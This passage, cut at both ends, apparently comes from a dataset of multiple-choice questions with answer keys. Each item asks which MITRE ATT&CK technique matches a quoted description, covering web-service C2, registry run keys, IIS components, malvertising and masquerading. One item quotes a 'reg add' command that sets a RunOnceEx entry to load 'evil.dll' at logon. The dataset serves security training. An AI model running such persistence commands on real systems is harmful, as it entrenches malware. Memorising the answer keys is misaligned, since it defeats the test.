      "choice": "A. Inhibit System Recovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\nA. Access Token Manipulation: Token Impersonation/Theft, B. Web Service: Bidirectional Communication, C. Indicator Removal: Clear Persistence, D. Impair Defenses: Impair Command History Logging",
    "context": "",
    "output": "B. Web Service: Bidirectional Communication",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
      "options": "A. Access Token Manipulation: Token Impersonation/Theft, B. Web Service: Bidirectional Communication, C. Indicator Removal: Clear Persistence, D. Impair Defenses: Impair Command History Logging",
      "choice": "B. Web Service: Bidirectional Communication",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files. These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis.\n\nPossible answers:\nA. Impair Defenses: Disable or Modify Linux Audit System, B. Boot or Logon Initialization Scripts: RC Scripts, C. Data from Configuration Repository: Network Device Configuration Dump, D. Masquerading",
    "context": "",
    "output": "C. Data from Configuration Repository: Network Device Configuration Dump",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files. These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis.",
      "options": "A. Impair Defenses: Disable or Modify Linux Audit System, B. Boot or Logon Initialization Scripts: RC Scripts, C. Data from Configuration Repository: Network Device Configuration Dump, D. Masquerading",
      "choice": "C. Data from Configuration Repository: Network Device Configuration Dump",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.\n\nAdversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.\n\nAdversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.\n\nOptions:\nA. Server Software Component: IIS Components, B. Network Service Discovery, C. Network Denial of Service: Reflection Amplification, D. Indicator Removal: File Deletion",
    "context": "",
    "output": "A. Server Software Component: IIS Components",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.\n\nAdversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.\n\nAdversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.",
      "options": "A. Server Software Component: IIS Components, B. Network Service Discovery, C. Network Denial of Service: Reflection Amplification, D. Indicator Removal: File Deletion",
      "choice": "A. Server Software Component: IIS Components",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes, including for Phishing, Drive-by Compromise, and Command and Control. Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD). Typosquatting may be used to aid in delivery of payloads via Drive-by Compromise. Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.\n\nDifferent URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).\n\nAdversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.\n\nOptions:\nA. Acquire Infrastructure: Domains, B. Cloud Service Discovery, C. Obtain Capabilities: Vulnerabilities, D. Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
    "context": "",
    "output": "A. Acquire Infrastructure: Domains",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes, including for Phishing, Drive-by Compromise, and Command and Control. Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD). Typosquatting may be used to aid in delivery of payloads via Drive-by Compromise. Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.\n\nDifferent URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).\n\nAdversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.",
      "options": "A. Acquire Infrastructure: Domains, B. Cloud Service Discovery, C. Obtain Capabilities: Vulnerabilities, D. Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
      "choice": "A. Acquire Infrastructure: Domains",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.\n\nA. Event Triggered Execution: Accessibility Features, B. Scheduled Task/Job: Scheduled Task, C. Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, D. Pre-OS Boot\nA:",
    "context": "",
    "output": "C. Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
      "options": "A. Event Triggered Execution: Accessibility Features, B. Scheduled Task/Job: Scheduled Task, C. Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, D. Pre-OS Boot",
      "choice": "C. Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.\n\nAdversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Phishing for Information), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).\n\nA. Office Application Startup: Office Template Macros, B. Application Layer Protocol: DNS, C. Search Open Technical Databases: WHOIS, D. Process Injection: VDSO Hijacking\nA:",
    "context": "",
    "output": "C. Search Open Technical Databases: WHOIS",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.\n\nAdversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Phishing for Information), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).",
      "options": "A. Office Application Startup: Office Template Macros, B. Application Layer Protocol: DNS, C. Search Open Technical Databases: WHOIS, D. Process Injection: VDSO Hijacking",
      "choice": "C. Search Open Technical Databases: WHOIS",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features or Terminal Services DLL for Persistence.\nA. Remote Services: Remote Desktop Protocol, B. System Location Discovery: System Language Discovery, C. Exfiltration Over Web Service, D. System Network Configuration Discovery: Wi-Fi Discovery",
    "context": "",
    "output": "A. Remote Services: Remote Desktop Protocol",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features or Terminal Services DLL for Persistence.",
      "options": "A. Remote Services: Remote Desktop Protocol, B. System Location Discovery: System Language Discovery, C. Exfiltration Over Web Service, D. System Network Configuration Discovery: Wi-Fi Discovery",
      "choice": "A. Remote Services: Remote Desktop Protocol",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for The technique include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of The technique in order to cause user discomfort, or to pressure compliance with accompanying messages.\n\nA. Defacement, B. Inter-Process Communication: Component Object Model, C. Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol, D. Pre-OS Boot: Bootkit\nA:",
    "context": "",
    "output": "A. Defacement",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for The technique include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of The technique in order to cause user discomfort, or to pressure compliance with accompanying messages.",
      "options": "A. Defacement, B. Inter-Process Communication: Component Object Model, C. Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol, D. Pre-OS Boot: Bootkit",
      "choice": "A. Defacement",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.\n\nAdversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).\n\nPossible answers:\nA. Search Open Technical Databases, B. Unsecured Credentials: Chat Messages, C. Use Alternate Authentication Material: Pass the Ticket, D. Search Open Websites/Domains: Search Engines",
    "context": "",
    "output": "A. Search Open Technical Databases",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.\n\nAdversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).",
      "options": "A. Search Open Technical Databases, B. Unsecured Credentials: Chat Messages, C. Use Alternate Authentication Material: Pass the Ticket, D. Search Open Websites/Domains: Search Engines",
      "choice": "A. Search Open Technical Databases",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements. Purchased ads may also target specific audiences using the advertising network\u2019s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. \n\nAdversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software. Adversary\u2019s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts. \n\nMalvertising may be used to support Drive-by Target and Drive-by Compromise, potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.\n\nAdversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement. Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.\n\nOptions:\nA. Acquire Infrastructure: Malvertising, B. Indicator Removal: Clear Persistence, C. System Script Proxy Execution, D. Process Injection: Ptrace System Calls",
    "context": "",
    "output": "A. Acquire Infrastructure: Malvertising",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements. Purchased ads may also target specific audiences using the advertising network\u2019s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. \n\nAdversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software. Adversary\u2019s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts. \n\nMalvertising may be used to support Drive-by Target and Drive-by Compromise, potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.\n\nAdversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement. Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.",
      "options": "A. Acquire Infrastructure: Malvertising, B. Indicator Removal: Clear Persistence, C. System Script Proxy Execution, D. Process Injection: Ptrace System Calls",
      "choice": "A. Acquire Infrastructure: Malvertising",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.\n\nAdversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Exploit Public-Facing Application).\n\nPossible answers:\nA. Exfiltration Over Web Service: Exfiltration to Code Repository, B. Obtain Capabilities, C. Gather Victim Org Information: Determine Physical Locations, D. Search Open Technical Databases: Scan Databases",
    "context": "",
    "output": "D. Search Open Technical Databases: Scan Databases",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.\n\nAdversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Exploit Public-Facing Application).",
      "options": "A. Exfiltration Over Web Service: Exfiltration to Code Repository, B. Obtain Capabilities, C. Gather Victim Org Information: Determine Physical Locations, D. Search Open Technical Databases: Scan Databases",
      "choice": "D. Search Open Technical Databases: Scan Databases",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. The technique occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of The technique.\nA. Domain Trust Discovery, B. Masquerading, C. System Binary Proxy Execution: Regsvcs/Regasm, D. Shared Modules\nAnswer:",
    "context": "",
    "output": "B. Masquerading",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
